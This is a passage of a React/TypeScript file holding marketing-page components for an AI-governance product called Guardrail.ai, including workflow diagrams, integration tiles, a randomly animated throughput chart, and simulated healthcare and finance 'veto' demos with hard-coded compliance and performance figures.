        { team: 'Engineering', action: 'Agentic Drift Detected', color: 'text-amber-400', icon: Code2 },
        { team: 'Legal / Compliance', action: 'Jurisdictional Veto Applied', color: 'text-emerald-400', icon: Shield },
        { team: 'Executive Board', action: 'Strategic Liability Neutralized', color: 'text-emerald-500', icon: UserCheck }
    ];

    return (
        <section className="py-24 border-b border-white/5 px-8 lg:px-16 overflow-hidden">
            <div className="flex flex-col gap-16">
                <div className="flex flex-col gap-4 max-w-4xl text-center mx-auto">
                    <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Enterprise Workflows
                        <ExecutiveSubtitle text="Cross-functional governance at the speed of intent." />
                    </h2>
                </div>

                <div className="relative flex flex-col md:flex-row justify-between items-center gap-12 max-w-5xl mx-auto w-full">
                    {/* Connection Line */}
                    <div className="absolute top-1/2 left-0 w-full h-px bg-white/10 hidden md:block -z-10" />

                    {steps.map((s, i) => (
                        <motion.div
                            key={i}
                            initial={{ opacity: 0, y: 20 }}
                            whileInView={{ opacity: 1, y: 0 }}
                            transition={{ delay: i * 0.2 }}
                            className="flex-1 flex flex-col items-center gap-6 group w-full"
                        >
                            <div className="w-24 h-24 rounded-full glass-morphism brutalist-border flex items-center justify-center p-6 relative group-hover:border-emerald-500/50 transition-all">
                                <s.icon className={`${s.color} group-hover:scale-110 transition-transform`} size={32} />
                                {i < steps.length - 1 && (
                                    <div className="absolute -right-6 top-1/2 -translate-y-1/2 hidden md:block">
                                        <ChevronRight size={12} className="opacity-20" />
                                    </div>
                                )}
                            </div>
                            <div className="flex flex-col items-center text-center gap-2">
                                <span className="text-[10px] font-black uppercase opacity-40 tracking-widest">{s.team}</span>
                                <span className={`text-base font-black italic uppercase leading-tight ${s.color}`}>{s.action}</span>
                            </div>
                        </motion.div>
                    ))}
                </div>

                <div className="p-12 border border-emerald-500/20 bg-emerald-500/5 relative overflow-hidden text-center max-w-3xl mx-auto w-full">
                    <p className="text-sm italic opacity-70 leading-relaxed">
                        &quot;Our multi-team veto protocol ensures that no single department can bypass institutional safety rules.
                        Engineering provides the signal, Legal provides the boundary, and the Board provides the finality.&quot;
                    </p>
                    <div className="mt-6 flex items-center justify-center gap-2">
                        <div className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                        <span className="text-[8px] font-black uppercase text-emerald-400 tracking-[0.4em]">Audit Trail Active: SPHINCS+ Signed</span>
                    </div>
                </div>
            </div>
        </section>
    );
};

// Integration Gallery
export const IntegrationGallery = () => {
    const integrations = [
        { name: 'Datadog', cat: 'Observability', icon: Activity },
        { name: 'Splunk', cat: 'Security SIEM', icon: Database },
        { name: 'AWS CloudTrail', cat: 'Infrastructure', icon: Server },
        { name: 'Jira Software', cat: 'Governance Ops', icon: Workflow },
        { name: 'Azure Active Directory', cat: 'Identity', icon: UserCircle2 },
        { name: 'Slack Enterprise', cat: 'Incidents', icon: Smartphone }
    ];

    return (
        <section className="py-24 border-b border-white/5 px-8 lg:px-16">
            <div className="flex flex-col gap-12">
                <div className="flex flex-col gap-4 max-w-4xl">
                    <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Integration Gallery
                        <ExecutiveSubtitle text="Unified governance across your existing stack." />
                    </h2>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-6">
                    {integrations.map((item, i) => (
                        <div key={i} className="p-6 glass-morphism border border-white/5 hover:border-emerald-500/30 transition-all group cursor-pointer flex flex-col items-center gap-4 text-center">
                            <div className="p-4 bg-white/5 rounded-lg group-hover:bg-emerald-500/10 transition-colors">
                                <item.icon size={24} className="opacity-40 group-hover:opacity-100 group-hover:text-emerald-400 transition-all" />
                            </div>
                            <div className="flex flex-col gap-1">
                                <span className="text-xs font-black italic uppercase tracking-tight">{item.name}</span>
                                <span className="text-[8px] font-black uppercase opacity-20 tracking-widest">{item.cat}</span>
                            </div>
                        </div>
                    ))}
                </div>

                <div className="flex items-center gap-4 py-8 border-t border-white/5 mt-8 justify-center opacity-40">
                    <span className="text-[9px] font-black uppercase tracking-widest italic">And 40+ more native connectors available via Sovereign SDK</span>
                    <button className="text-[9px] font-black border-b border-white/20 hover:text-emerald-400 transition-colors uppercase tracking-widest">Browse Full Directory</button>
                </div>
            </div>
        </section>
    );
};

// Scalability Performance Dashboard
export const ScalabilityPerformanceDashboard = () => {
    return (
        <section className="py-24 border-b border-white/5 px-8 lg:px-16 bg-black relative overflow-hidden">
            {/* Background Animation */}
            <div className="absolute inset-0 opacity-10 pointer-events-none">
                <div className="absolute inset-0" style={{ backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 1px, rgba(16, 185, 129, 0.1) 1px, rgba(16, 185, 129, 0.1) 2px)', backgroundSize: '100% 20px' }} />
            </div>

            <div className="flex flex-col lg:flex-row gap-24 items-center relative z-10">
                <div className="flex-1 flex flex-col gap-8">
                    <div className="flex flex-col gap-4">
                        <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                            Scalability & Performance
                            <ExecutiveSubtitle text="Engineered for 10K+ concurrent agents." />
                        </h2>
                        <h3 className="text-5xl font-black italic uppercase leading-none">Sub-millisecond<br /><span className="text-emerald-400">Governance Veto.</span></h3>
                        <p className="text-xl opacity-60 leading-relaxed italic border-l-4 border-emerald-500/30 pl-8">
                            Our L1 Hardware intercept layer ensures that governance checking never becomes a bottleneck. Even at massive scale, the Sovereign Signal remains deterministic.
                        </p>
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                        <div className="p-8 glass-morphism brutalist-border flex flex-col gap-2 group">
                            <span className="text-4xl font-black italic text-emerald-400 group-hover:scale-105 transition-transform origin-left">120K+</span>
                            <span className="text-[10px] font-black uppercase opacity-40 tracking-widest">Requests / Minute</span>
                        </div>
                        <div className="p-8 glass-morphism brutalist-border flex flex-col gap-2 group">
                            <span className="text-4xl font-black italic text-emerald-400 group-hover:scale-105 transition-transform origin-left">&lt; 4.2ms</span>
                            <span className="text-[10px] font-black uppercase opacity-40 tracking-widest">Avg. Intercept Latency</span>
                        </div>
                    </div>
                </div>

                <div className="flex-1 w-full p-12 glass-morphism brutalist-border relative bg-emerald-500/[0.02]">
                    <div className="flex justify-between items-center mb-8">
                        <div className="flex items-center gap-2">
                            <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                            <span className="text-[10px] font-black uppercase tracking-widest italic">Live Global Throughput</span>
                        </div>
                        <span className="text-[10px] font-mono opacity-40">UTC: {new Date().toISOString()}</span>
                    </div>

                    {/* Simulating a Waveform/Chart */}
                    <div className="h-48 flex items-end gap-1.5 opacity-60">
                        {Array(30).fill(0).map((_, i) => (
                            <motion.div
                                key={i}
                                initial={{ height: '10%' }}
                                animate={{ height: `${20 + Math.random() * 80}%` }}
                                transition={{ repeat: Infinity, duration: 1, repeatType: 'reverse', delay: i * 0.05 }}
                                className="flex-1 bg-emerald-500/30 border-t border-emerald-400"
                            />
                        ))}
                    </div>

                    <div className="mt-8 grid grid-cols-3 gap-4 pt-8 border-t border-white/5">
                        <div className="flex flex-col gap-1">
                            <span className="text-[8px] font-black uppercase opacity-20">Uptime</span>
                            <span className="text-sm font-black italic uppercase">99.9999%</span>
                        </div>
                        <div className="flex flex-col gap-1 text-center">
                            <span className="text-[8px] font-black uppercase opacity-20">Clusters</span>
                            <span className="text-sm font-black italic uppercase font-mono">14+ Active</span>
                        </div>
                        <div className="flex flex-col gap-1 text-right">
                            <span className="text-[8px] font-black uppercase opacity-20">Packet Loss</span>
                            <span className="text-sm font-black italic uppercase text-emerald-400">0.000%</span>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    );
};

/* ============================================================
   PHASE 117: HUMAN-CENTRIC PRODUCTS
   Domain-Specific Solutions, Accessibility, Emotional Resonance
   ============================================================ */

// Compliance Tag Strip — row of framework badges with tooltips
export const ComplianceTagStrip = ({ tags }: { tags: { label: string; color?: string }[] }) => (
    <div className="flex flex-wrap gap-3 items-center">
        {tags.map((t, i) => (
            <motion.span
                key={i}
                initial={{ opacity: 0, scale: 0.8 }}
                whileInView={{ opacity: 1, scale: 1 }}
                transition={{ delay: i * 0.05 }}
                className={`px-4 py-2 border text-[10px] font-black uppercase tracking-[0.25em] ${t.color || 'border-emerald-500/40 text-emerald-400 bg-emerald-500/5'}`}
            >
                {t.label}
            </motion.span>
        ))}
    </div>
);

// Human Need Statement — emotional anchor at top of each domain page
export const HumanNeedStatement = ({ statement, domain }: { statement: string; domain: string }) => (
    <MotionReveal>
        <div className="flex flex-col gap-4 max-w-4xl">
            <span className="text-[9px] font-black uppercase tracking-[0.5em] text-emerald-400 opacity-60">{domain} // Human Need</span>
            <p className="text-4xl md:text-6xl font-black italic uppercase leading-[0.9] text-white">
                {statement}
            </p>
            <div className="w-24 h-1 bg-emerald-500 mt-4" />
        </div>
    </MotionReveal>
);

// Domain Solution Hero — reusable hero for any vertical
export const DomainSolutionHero = ({
    domain,
    tagline,
    statement,
    complianceTags,
    ctaLabel,
    icon: Icon,
}: {
    domain: string;
    tagline: string;
    statement: string;
    complianceTags: { label: string; color?: string }[];
    ctaLabel: string;
    icon: any;
}) => (
    <section className="py-32 px-8 lg:px-16 relative overflow-hidden border-b border-white/5">
        <motion.div
            animate={{ opacity: [0.03, 0.07, 0.03], scale: [1, 1.05, 1] }}
            transition={{ duration: 12, repeat: Infinity }}
            className="absolute inset-0 flex items-center justify-end pointer-events-none pr-24"
        >
            <Icon size={480} className="text-emerald-500" />
        </motion.div>
        <div className="relative z-10 flex flex-col gap-12 max-w-5xl">
            <div className="flex flex-col gap-2">
                <span className="text-[9px] font-black uppercase tracking-[0.5em] text-emerald-400">{domain} Solutions</span>
                <h1 className="text-5xl md:text-7xl font-black italic uppercase leading-[0.85]">{statement}</h1>
                <p className="text-xl opacity-50 italic mt-4 max-w-xl leading-relaxed">{tagline}</p>
            </div>
            <ComplianceTagStrip tags={complianceTags} />
            <div className="flex gap-6 flex-wrap">
                <motion.button
                    whileHover={{ scale: 1.05, boxShadow: '0 0 30px rgba(16,185,129,0.25)' }}
                    whileTap={{ scale: 0.96 }}
                    className="px-10 py-5 bg-emerald-500 text-black font-black uppercase italic tracking-widest hover:bg-emerald-400 transition-all"
                >
                    {ctaLabel}
                </motion.button>
                <motion.button
                    whileHover={{ scale: 1.03, borderColor: '#00ff88', color: '#00ff88' }}
                    className="px-10 py-5 border border-white/20 font-black uppercase italic tracking-widest transition-all"
                >
                    View Live Demo
                </motion.button>
            </div>
        </div>
    </section>
);

// Healthcare Domain Card — patient data flow visualization
export const HealthcareDomainCard = () => {
    const [intercepted, setIntercepted] = useState(false);
    return (
        <section className="py-24 px-8 lg:px-16 border-b border-white/5">
            <MotionReveal>
                <div className="flex flex-col gap-4 mb-16">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Patient Data Safety Engine
                        <ExecutiveSubtitle text="Every clinical AI decision, constitutionally governed." />
                    </h2>
                </div>
            </MotionReveal>
            <div className="grid lg:grid-cols-2 gap-16 items-start">
                <div className="flex flex-col gap-4">
                    {[
                        { step: '01', label: 'Patient Query Received', desc: 'Clinical AI receives patient PII in a diagnostic workflow.', blocked: false },
                        { step: '02', label: 'HIPAA Boundary Check', desc: 'Sovereign Intercept validates data against HIPAA § 164.514.', blocked: false },
                        { step: '03', label: 'Model Intent Analysis', desc: "Trinity Consensus audits the LLM's proposed action in 2.1ms.", blocked: intercepted },
                        { step: '04', label: 'JUD-CERT Issued', desc: 'Judicial-grade audit certificate attached to every clinical decision.', blocked: false },
                    ].map((item, i) => (
                        <motion.div
                            key={i}
                            initial={{ opacity: 0, x: -20 }}
                            whileInView={{ opacity: 1, x: 0 }}
                            transition={{ delay: i * 0.1 }}
                            className={`flex gap-5 items-start p-6 border transition-all ${item.blocked ? 'border-red-500/40 bg-red-500/5' : 'border-white/5 hover:border-emerald-500/20'}`}
                        >
                            <span className="text-[10px] font-black font-mono opacity-20 mt-1">{item.step}</span>
                            <div className="flex flex-col gap-1 flex-1">
                                <span className="text-sm font-black italic uppercase">{item.label}</span>
                                <p className="text-[11px] opacity-50 leading-relaxed">{item.desc}</p>
                            </div>
                            <div className={`px-2 py-1 text-[8px] font-black uppercase tracking-widest flex-shrink-0 ${item.blocked ? 'bg-red-500/20 text-red-400' : 'bg-emerald-500/20 text-emerald-400'}`}>
                                {item.blocked ? 'VETOED' : 'SAFE'}
                            </div>
                        </motion.div>
                    ))}
                </div>
                <div className="flex flex-col gap-8 p-10 glass-morphism brutalist-border">
                    <h3 className="text-2xl font-black italic uppercase">Simulate a HIPAA Drift Event</h3>
                    <p className="text-sm opacity-50 italic leading-relaxed">Toggle a rogue model attempting to extract PII outside the clinical boundary.</p>
                    <div className="flex items-center gap-6">
                        <motion.button
                            whileTap={{ scale: 0.95 }}
                            onClick={() => setIntercepted(v => !v)}
                            aria-pressed={intercepted}
                            aria-label="Toggle HIPAA drift simulation"
                            className={`relative w-16 h-8 rounded-full transition-colors ${intercepted ? 'bg-red-500' : 'bg-emerald-500/30'}`}
                        >
                            <motion.div animate={{ x: intercepted ? 32 : 0 }} className="absolute top-1 left-1 w-6 h-6 rounded-full bg-white" />
                        </motion.button>
                        <span className="text-sm font-black uppercase italic opacity-60">{intercepted ? 'Rogue Mode: ACTIVE — VETOED' : 'Normal Mode: Safe'}</span>
                    </div>
                    <div className={`p-6 border font-mono text-[10px] leading-relaxed transition-all ${intercepted ? 'border-red-500/40 bg-red-500/5 text-red-400' : 'border-emerald-500/20 bg-emerald-500/5 text-emerald-400'}`}>
                        {intercepted
                            ? 'VETO_CONFIRMED: Patient PII exfiltration attempt blocked.\nHIPAA § 164.514 boundary enforced.\nJUD-CERT: HC-VETO-2026-0302\nForensic hash: 0x4f2a...sha256'
                            : 'STATUS: All clinical AI operations within HIPAA boundary.\nNext audit checkpoint: 00:14:32\nActive guardrails: 24\nCompliance score: 100%'}
                    </div>
                </div>
            </div>
        </section>
    );
};

// Financial Risk Simulator — live veto drill with adjustable drift
export const FinancialRiskSimulator = () => {
    const [drift, setDrift] = useState(5.0);
    const [running, setRunning] = useState(false);
    const [vetoed, setVetoed] = useState(false);
    const liability = (drift * 2.96).toFixed(2);

    const runVeto = () => {
        setRunning(true);
        setVetoed(false);
        setTimeout(() => { setRunning(false); setVetoed(true); }, 1200);
    };

    return (
        <section className="py-24 px-8 lg:px-16 border-b border-white/5 bg-black/40">
            <MotionReveal>
                <div className="flex flex-col gap-4 mb-16">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Financial Risk Simulator
                        <ExecutiveSubtitle text="Quantify institutional immunity in real time." />
                    </h2>
                </div>
            </MotionReveal>
            <div className="grid lg:grid-cols-2 gap-16 items-start">
                <div className="flex flex-col gap-10">
                    <div className="flex flex-col gap-4">
                        <div className="flex justify-between items-center">
                            <span className="text-[10px] font-black uppercase tracking-widest opacity-40">Model Drift / Adversarial Deviation</span>
                            <span className="text-2xl font-black italic text-amber-400">{drift.toFixed(1)}%</span>
                        </div>
                        <input
                            type="range" min={0.5} max={20} step={0.5} value={drift}
                            onChange={e => { setDrift(Number(e.target.value)); setVetoed(false); }}
                            className="w-full accent-emerald-500"
                            aria-label="Adjust model drift percentage"
                        />
                    </div>
                    <div className="grid grid-cols-2 gap-6">
                        <div className="p-8 glass-morphism brutalist-border flex flex-col gap-2">
                            <span className="text-[8px] font-black uppercase opacity-20 tracking-widest">Liability Exposure</span>
                            <span className="text-3xl font-black italic text-red-400">${liability}M</span>
                        </div>
                        <div className="p-8 glass-morphism brutalist-border flex flex-col gap-2">
                            <span className="text-[8px] font-black uppercase opacity-20 tracking-widest">With Guardrail.ai</span>
                            <span className="text-3xl font-black italic text-emerald-400">$0.00</span>
                        </div>
                    </div>
                    <motion.button
                        whileHover={{ scale: 1.04 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={runVeto}
                        disabled={running}
                        className={`px-10 py-5 font-black uppercase italic tracking-widest transition-all flex items-center gap-4 ${running ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40' : 'bg-emerald-500 text-black hover:bg-emerald-400'}`}
                    >
                        <Zap size={16} />
                        {running ? 'Intercepting...' : 'Trigger SEC Veto Drill'}
                    </motion.button>
                </div>
                <AnimatePresence mode="wait">
                    {vetoed ? (
                        <motion.div key="vetoed" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="p-12 border border-emerald-500/40 bg-emerald-500/5 flex flex-col gap-6">
                            <div className="flex items-center gap-4">
                                <div className="w-3 h-3 rounded-full bg-emerald-400 animate-pulse" />
                                <span className="text-[10px] font-black uppercase tracking-widest text-emerald-400">Veto Executed — 3.8ms</span>
                            </div>
                            <h3 className="text-3xl font-black italic uppercase">CAPITAL PROTECTED</h3>
                            <p className="text-sm opacity-60 italic leading-relaxed">Guardrail.ai blocked the rogue trade at the sovereignty layer. SEC Rule 17a-4 forensic certificate issued.</p>
                            <div className="font-mono text-[10px] opacity-50 p-4 bg-black/40 border border-white/5">
                                VETO_ID: SEC-2026-VT-{Math.floor(drift * 1000)}<br />
                                PROTECTED: ${liability}M<br />
                                COMPLIANCE: BaFin + SEC + Basel IV<br />
                                JUD-CERT: FIN-{Math.floor(Date.now() / 1000)}
                            </div>
                        </motion.div>
                    ) : (
                        <motion.div key="idle" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="p-12 glass-morphism brutalist-border flex flex-col gap-6">
                            <h3 className="text-xl font-black italic uppercase opacity-40">Awaiting Drill Trigger</h3>
                            <p className="text-sm opacity-30 italic leading-relaxed">Adjust the drift slider, then trigger the SEC veto drill to see live intercept response.</p>
                            <div className="grid grid-cols-2 gap-4 mt-4 opacity-30">
                                {['SEC', 'Basel IV', 'BaFin', 'DPDP-2026'].map(tag => (
                                    <span key={tag} className="px-3 py-2 border border-white/10 text-[9px] font-black uppercase tracking-widest text-center">{tag}</span>
                                ))}
                            </div>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </section>
    );
};

// Academic Integrity Visualizer — drift detection audit log
export const AcademicIntegrityVisualizer = () => {
    const events = [
        { time: '09:14:02', agent: 'Study Assistant v2', event: 'Essay generation request', status: 'safe', detail: 'Within academic assistance policy' },
        { time: '09:14:15', agent: 'Study Assistant v2', event: 'Direct exam answer output', status: 'drift', detail: 'Academic integrity boundary exceeded' },
        { time: '09:14:16', agent: 'Sovereign Intercept', event: 'FERPA drift veto applied', status: 'veto', detail: 'JUD-CERT: EDU-VETO-2026-0041' },
        { time: '09:14:18', agent: 'Guardrail.ai', event: 'Faculty alert dispatched', status: 'safe', detail: 'Notification sent to course instructor' },
    ];
    return (
        <section className="py-24 px-8 lg:px-16 border-b border-white/5">
            <MotionReveal>
                <div className="flex flex-col gap-4 mb-16">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Academic Integrity Monitor
                        <ExecutiveSubtitle text="Real-time drift detection for student-facing AI." />
                    </h2>
                </div>
            </MotionReveal>
            <div className="flex flex-col gap-3 max-w-4xl">
                {events.map((ev, i) => (
                    <motion.div
                        key={i}
                        initial={{ opacity: 0, x: -20 }}
                        whileInView={{ opacity: 1, x: 0 }}
                        transition={{ delay: i * 0.12 }}
                        className={`flex items-start gap-6 p-6 border font-mono text-[11px] transition-all ${ev.status === 'veto' ? 'border-red-500/40 bg-red-500/5' : ev.status === 'drift' ? 'border-amber-500/30 bg-amber-500/5' : 'border-white/5'}`}
                    >
                        <span className="opacity-30 whitespace-nowrap">{ev.time}</span>
                        <span className={`px-2 py-0.5 text-[8px] font-black uppercase whitespace-nowrap flex-shrink-0 ${ev.status === 'veto' ? 'bg-red-500/20 text-red-400' : ev.status === 'drift' ? 'bg-amber-500/20 text-amber-400' : 'bg-emerald-500/20 text-emerald-400'}`}>
                            {ev.status.toUpperCase()}
                        </span>
                        <div className="flex flex-col gap-1 flex-1 min-w-0">
                            <span className="font-black uppercase not-italic text-white/80 truncate">{ev.event}</span>
                            <span className="opacity-40 italic text-[10px]">{ev.agent} — {ev.detail}</span>
                        </div>
                    </motion.div>
                ))}
            </div>
        </section>
    );
};

// Responsibility Chain — animated accountability diagram
export const ResponsibilityChain = ({ domain = 'Education' }: { domain?: string }) => {
    const chain = [
        { role: 'User', icon: UserCircle2, desc: 'Initiates AI-assisted task' },
        { role: 'Institution', icon: Briefcase, desc: 'Sets acceptable use policy' },
        { role: 'AI Provider', icon: Brain, desc: 'Delivers model output' },
        { role: 'Guardrail.ai', icon: Shield, desc: 'Sovereign constitutional veto layer' },
    ];
    return (
        <section className="py-24 px-8 lg:px-16 border-b border-white/5 bg-emerald-950/5">
            <MotionReveal>
                <div className="flex flex-col gap-4 mb-16 text-center">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Accountability Chain
                        <ExecutiveSubtitle text={`Who is responsible in ${domain} AI deployments.`} />
                    </h2>
                </div>
            </MotionReveal>
            <div className="flex flex-col md:flex-row items-center justify-center gap-0 max-w-5xl mx-auto">
                {chain.map((node, i) => (
                    <React.Fragment key={i}>
                        <motion.div
                            initial={{ opacity: 0, y: 30 }}
                            whileInView={{ opacity: 1, y: 0 }}
                            transition={{ delay: i * 0.15 }}
                            whileHover={{ y: -8 }}
                            className={`flex flex-col items-center gap-4 p-8 min-w-[150px] transition-all ${i === chain.length - 1 ? 'bg-emerald-500/10 border-2 border-emerald-500/40' : 'glass-morphism brutalist-border'}`}
                        >
                            <div className={`p-4 rounded-full ${i === chain.length - 1 ? 'bg-emerald-500 text-black' : 'bg-white/5 text-emerald-400'}`}>
                                <node.icon size={24} />
                            </div>
                            <div className="text-center flex flex-col gap-1">
                                <span className={`text-xs font-black italic uppercase ${i === chain.length - 1 ? 'text-emerald-400' : ''}`}>{node.role}</span>
                                <p className="text-[9px] opacity-40 leading-relaxed">{node.desc}</p>
                            </div>
                        </motion.div>
                        {i < chain.length - 1 && (
                            <div className="hidden md:flex items-center w-10">
                                <div className="w-full h-px bg-emerald-500/20" />
                                <ChevronRight size={10} className="text-emerald-500/30 flex-shrink-0" />
                            </div>
                        )}
                    </React.Fragment>
                ))}
            </div>
        </section>
    );
};

// Global Culture Panel — 4-region AI ethics framing
export const GlobalCulturePanel = () => {
    const regions = [
        {
            region: 'APAC', flag: '🌏', ethic: 'Collective Harmony',
            desc: 'AI governance grounded in collective responsibility. Compliance as a social obligation.',
            frameworks: ['PDPA (SG)', 'PIPL (CN)', 'IT Act (IN)'],
            color: 'border-blue-500/20 bg-blue-500/5'
        },
        {
            region: 'European Union', flag: '🇪🇺', ethic: 'Fundamental Rights First',
            desc: 'Human oversight by design. GDPR and EU AI Act enforce transparency and the right to be free from automated harm.',
            frameworks: ['EU AI Act', 'GDPR', 'DPDP-2026'],
            color: 'border-purple-500/20 bg-purple-500/5'
        },
        {
            region: 'United States', flag: '🇺🇸', ethic: 'Risk-Based Governance',
            desc: 'Liability-driven frameworks. NIST AI RMF prioritizes measurable risk reduction and documented safety evidence.',
            frameworks: ['NIST AI RMF', 'SEC 17a-4', 'HIPAA'],
            color: 'border-amber-500/20 bg-amber-500/5'
        },
        {
            region: 'Emerging Markets', flag: '🌍', ethic: 'Access-First Ethics',
            desc: 'Inclusive governance without paternalism. Building AI safety that scales equitably across diverse landscapes.',
            frameworks: ['AU AI Framework', 'BR LGPD', 'ZA POPIA'],
            color: 'border-emerald-500/20 bg-emerald-500/5'
        }
    ];
    return (
        <section className="py-24 px-8 lg:px-16 border-b border-white/5">
            <MotionReveal>
                <div className="flex flex-col gap-4 mb-16">
                    <h2 className="text-xs font-black tracking-[0.4em] text-emerald-400 uppercase">
                        Global AI Ethics Considerations
                        <ExecutiveSubtitle text="Cultural and jurisdictional differences in AI governance." />
                    </h2>
                </div>
            </MotionReveal>
            <div className="grid md:grid-cols-2 gap-8">
                {regions.map((r, i) => (
                    <motion.div
                        key={i}
                        initial={{ opacity: 0, y: 20 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        transition={{ delay: i * 0.1 }}
                        whileHover={{ y: -4 }}
                        className={`p-10 border ${r.color} flex flex-col gap-6 transition-all`}
                    >
                        <div className="flex items-start gap-4">
                            <span className="text-3xl" role="img" aria-label={r.region}>{r.flag}</span>
                            <div className="flex flex-col gap-1">
                                <span className="text-[10px] font-black uppercase tracking-[0.3em] opacity-40">{r.region}</span>
                                <h3 className="text-xl font-black italic uppercase">{r.ethic}</h3>
                            </div>
                        </div>
                        <p className="text-sm opacity-60 leading-relaxed italic">{r.desc}</p>
                        <div className="flex flex-wrap gap-2 pt-4 border-t border-white/5">
                            {r.frameworks.map(fw => (
                                <span key={fw} className="px-3 py-1 border border-white/10 text-[9px] font-black uppercase tracking-widest opacity-60">{fw}</span>
                            ))}
                        </div>
                    </motion.div>
                ))}
            </div>
        </section>
    );
};

// Accessibility Control Bar — persistent floating a11y widget
export const AccessibilityControlBar = () => {
    const [open, setOpen] = useState(false);
    const [highContrast, setHighContrast] = useState(false);
    const [largeText, setLargeText] = useState(false);
    const [reduceMotion, setReduceMotion] = useState(false);

    useEffect(() => {
        document.body.classList.toggle('high-contrast', highContrast);
        document.body.classList.toggle('large-text', largeText);
        document.body.classList.toggle('reduce-motion', reduceMotion);
    }, [highContrast, largeText, reduceMotion]);

    return (
        <div className="fixed bottom-8 right-8 z-[90] flex flex-col items-end gap-3" role="complementary" aria-label="Accessibility Controls">
            <AnimatePresence>
                {open && (
                    <motion.div
                        initial={{ opacity: 0, scale: 0.9, y: 10 }}
                        animate={{ opacity: 1, scale: 1, y: 0 }}
                        exit={{ opacity: 0, scale: 0.9, y: 10 }}
                        className="p-6 bg-black border border-white/10 flex flex-col gap-4 shadow-2xl w-56"
                        role="dialog"
                        aria-label="Accessibility settings"
                    >
                        <span className="text-[9px] font-black uppercase tracking-[0.3em] opacity-40">Accessibility</span>
                        {[
                            { label: 'High Contrast', state: highContrast, toggle: () => setHighContrast(v => !v) },
                            { label: 'Large Text', state: largeText, toggle: () => setLargeText(v => !v) },
                            { label: 'Reduce Motion', state: reduceMotion, toggle: () => setReduceMotion(v => !v) },
                        ].map(item => (
                            <div key={item.label} className="flex items-center justify-between">
                                <span className="text-[10px] font-black uppercase opacity-60">{item.label}</span>
                                <button
                                    onClick={item.toggle}
                                    aria-pressed={item.state}
                                    aria-label={`Toggle ${item.label}`}
                                    className={`relative w-10 h-5 rounded-full transition-colors ${item.state ? 'bg-emerald-500' : 'bg-white/10'}`}
                                >
                                    <motion.div animate={{ x: item.state ? 20 : 2 }} className="absolute top-0.5 w-4 h-4 rounded-full bg-white" />
                                </button>
                            </div>
                        ))}
                    </motion.div>
                )}
            </AnimatePresence>
            <motion.button
                whileHover={{ scale: 1.1 }}
                whileTap={{ scale: 0.9 }}
                onClick={() => setOpen(v => !v)}
                aria-label="Open accessibility options"
                aria-expanded={open}
                className="w-12 h-12 bg-black border border-white/20 hover:border-emerald-500/40 flex items-center justify-center transition-all"
            >
                <Eye size={18} className="text-emerald-400" />
            </motion.button>
        </div>
    );
};

// Emotional Resonance Section — human values: Trust, Safety, Responsibility
export const EmotionalResonanceSection = () => {
    const values = [
        {
            title: 'Trust',
            icon: Shield,
            desc: 'Every deployment decision creates or erodes institutional trust. Guardrail.ai makes trust the baseline — not the outcome.'
        },
        {
            title: 'Safety',
            icon: UserCheck,
            desc: 'Safety is not a feature checkbox. It is a constitutional obligation embedded at the hardware level before any model runs.'
        },
        {
            title: 'Responsibility',
            icon: Briefcase,
            desc: 'Responsibility in AI means knowing — with certainty — that when a model acts, a human can prove what happened and what stopped it.'
        }
    ];
    return (
        <section className="py-32 px-8 lg:px-16 bg-gradient-to-b from-black to-emerald-950/10 relative overflow-hidden border-y border-white/5">
            <motion.div
                animate={{ opacity: [0.02, 0.06, 0.02] }}
                transition={{ duration: 15, repeat: Infinity }}
                className="absolute inset-0 flex items-center justify-center pointer-events-none"
            >
                <Shield size={600} className="text-emerald-500" />
            </motion.div>
            <div className="relative z-10 flex flex-col gap-20 max-w-6xl mx-auto">
                <MotionReveal>
                    <div className="flex flex-col gap-6 text-center items-center max-w-3xl mx-auto">
                        <span className="text-[9px] font-black uppercase tracking-[0.5em] text-emerald-400">Why It Matters</span>
                        <h2 className="text-5xl md:text-7xl font-black italic uppercase leading-[0.85]">
                            Behind every AI decision<br />
                            <span className="text-emerald-400">is a human consequence.</span>
                        </h2>
                        <p className="text-xl opacity-50 italic leading-relaxed max-w-2xl">
                            Guardrail.ai was built because AI failures are not technical inconveniences —
                            they are human events with legal, financial, and moral consequences.
                        </p>
                    </div>
                </MotionReveal>
                <div className="grid md:grid-cols-3 gap-8">
                    {values.map((v, i) => (
                        <motion.div
                            key={i}
                            initial={{ opacity: 0, y: 30 }}
                            whileInView={{ opacity: 1, y: 0 }}
                            transition={{ delay: i * 0.15, duration: 0.6 }}
                            whileHover={{ y: -10, boxShadow: '0 20px 60px rgba(16,185,129,0.08)' }}
                            className="flex flex-col gap-6 p-10 glass-morphism border border-emerald-500/10 hover:border-emerald-500/30 transition-all text-center items-center"
                        >
                            <div className="w-20 h-20 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
                                <v.icon size={32} className="text-emerald-400" />
                            </div>
                            <h3 className="text-3xl font-black italic uppercase text-emerald-400">{v.title}</h3>
                            <p className="text-sm opacity-60 leading-relaxed italic">{v.desc}</p>
                        </motion.div>
                    ))}
                </div>
            </div>
        </section>
    );
};

// Solutions Navigation pills — cross-domain header bar
export const SolutionsNav = ({ active }: { active?: string }) => {
    const links = [
        { label: 'Healthcare', href: '/solutions/healthcare', tag: 'HIPAA' },
        { label: 'Finance', href: '/solutions/finance', tag: 'SEC / BaFin' },
